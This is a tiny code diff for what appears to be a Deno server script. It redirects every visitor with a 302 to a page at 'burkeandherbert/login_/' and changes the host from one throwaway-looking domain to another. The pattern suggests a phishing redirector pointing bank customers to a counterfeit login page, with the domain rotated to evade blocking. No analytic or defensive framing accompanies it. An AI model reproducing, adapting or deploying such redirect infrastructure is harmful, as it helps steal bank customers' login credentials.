@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://acerevieaw.biz/burkeandherbert/login_/",
+      Location: "https://ixler.cyou/burkeandherbert/login_/",
     },
   });
 });
